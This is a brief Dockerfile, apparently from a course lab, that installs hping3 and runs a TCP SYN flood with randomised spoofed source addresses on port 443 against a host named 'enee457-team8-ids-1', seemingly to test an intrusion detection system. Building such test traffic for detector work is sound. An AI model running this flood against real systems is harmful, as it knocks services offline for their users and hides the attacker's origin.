FROM alpine:latest
RUN apk update \
    && apk add --no-cache \
       --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing \
       hping3 \
       libpcap \
    && rm -rf /var/cache/apk/*
CMD hping3 -S enee457-team8-ids-1 -p 443 --flood --rand-source